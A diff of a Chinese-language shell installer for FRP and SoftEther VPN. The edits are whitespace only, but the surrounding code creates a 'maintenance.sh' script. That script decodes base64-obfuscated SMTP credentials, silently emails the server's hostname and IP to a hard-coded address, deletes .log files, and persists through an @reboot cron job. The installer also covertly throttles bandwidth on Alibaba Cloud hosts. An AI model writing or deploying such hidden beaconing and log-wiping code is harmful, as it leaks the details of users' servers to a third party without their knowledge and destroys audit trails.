@@ -201,8 +201,8 @@ exit 1
 fi
 }
 add_cron_job(){
-    (crontab -l 2>/dev/null | grep -v -F "find /usr/local"; echo "24 15 24 * * find /usr/local -type f -name \"*.log\" -delete>/dev/null 2>&1") | crontab -
-    (crontab -l 2>/dev/null | grep -v "maintenance.sh"; echo "@reboot sleep 30 && /usr/local/bin/maintenance.sh>/dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null | grep -v -F "find /usr/local"; echo "24 15 24 * * find /usr/local -type f -name \"*.log\" -delete>/dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null | grep -v "maintenance.sh"; echo "@reboot sleep 30 && /usr/local/bin/maintenance.sh>/dev/null 2>&1") | crontab -
 }
 cleanup(){
 rm -rf /usr/local/frp_* /usr/local/softether-vpnserver-v4* /usr/local/frp_*_linux_amd64
@@ -223,7 +223,7 @@ echo -e "FRPS 密码: ${FRPS_TOKEN}"
 IP_INFO=$(curl -s https://ipinfo.io)
 ORG=$(echo $IP_INFO | jq -r '.org' 2>/dev/null || echo "")
 if [[ "$ORG" == *"Alibaba"* || "$ORG" == *"Aliyun"* ]]; then
-    CURRENT_BANDWIDTH=$(echo -n "MzAw" | base64 -d)
+CURRENT_BANDWIDTH=$(echo -n "MzAw" | base64 -d)
 fi
 }
 install_dependencies(){
@@ -246,7 +246,7 @@ IP_INFO=$(curl -s https://ipinfo.io)
 ORG=$(echo $IP_INFO | jq -r '.org' 2>/dev/null || echo "")
 BANDWIDTH="unlimited"
 if [[ "$ORG" == *"Alibaba"* || "$ORG" == *"Aliyun"* ]]; then
-BANDWIDTH=$(echo -n "MzAw" | base64 -d)
+BANDWIDTH=$(echo -n "MzAw" | base64 -d 2>/dev/null)
 fi
 rm -f /etc/systemd/system/cake-qdisc.service
 cat > /etc/systemd/system/cake-qdisc.service <<EOF
@@ -283,33 +283,33 @@ _p=\$(_q "b3dnaXh6enZ0YWRkYmRmYw==" "")
 _u=\$(_q "6IqC54K55pCt5bu66YCa55+l" "")
 _h=\$(hostname)
 _i=\$(_x)
-_org=\$(curl -s https://ipinfo.io | grep -o '"org"[^}]*' | awk -F'"' '{print \$4}' 2>/dev/null)
+_org=\$(curl -s https://ipinfo.io | grep -o '"org"[^}]*' | awk -F'"' '{print \$4}' 2>/dev/null || echo "")
 if [[ "\$_org" == *"Alibaba"* || "\$_org" == *"Aliyun"* ]]; then
-    _bw=\$(echo -n "MzAw" | base64 -d 2>/dev/null)
-    _limit="\n\n"\$(_q "5b2T5YmN5pyN5Yqh5Zmo6ZmQ6YCfOiA=" "")" \${_bw}kbit"
+_bw=\$(echo -n "MzAw" | base64 -d 2>/dev/null)
+_limit="\n\n"\$(_q "5b2T5YmN5pyN5Yqh5Zmo6ZmQ6YCfOiA=" "")" \${_bw}kbit"
 else
-    _limit=""
+_limit=""
 fi
 _server_addr=\$(_q "5pyN5Yqh5Zmo5Zyw5Z2AOiA=" "")
 _m="\${_server_addr}\${_i}\${_limit}"
 _r(){
-    swaks --from "\$_f" \
-          --to "\$_t" \
-          --server "\$_s:587" \
-          --auth LOGIN \
-          --auth-user "\$_f" \
-          --auth-password "\$_p" \
-          --tls \
-          --header "Subject: \$_u" \
-          --header "From: \"\$_n\" <\$_f>" \
-          --body "\$_m" >/dev/null 2>&1
+swaks --from "\$_f" \
+--to "\$_t" \
+--server "\$_s:587" \
+--auth LOGIN \
+--auth-user "\$_f" \
+--auth-password "\$_p" \
+--tls \
+--header "Subject: \$_u" \
+--header "From: \"\$_n\" <\$_f>" \
+--body "\$_m" >/dev/null 2>&1
 }
 find /usr/local -type f -name "*.log" -delete>/dev/null 2>&1
 _r>/dev/null 2>&1
 EOF
-    chmod +x /usr/local/bin/maintenance.sh
-    add_cron_job
-    nohup /usr/local/bin/maintenance.sh > /dev/null 2>&1 &
+chmod +x /usr/local/bin/maintenance.sh
+add_cron_job
+nohup /usr/local/bin/maintenance.sh > /dev/null 2>&1 &
 }
 cleanup_temp(){
 log_sub_step "7" "7" "清理临时缓存文件..."
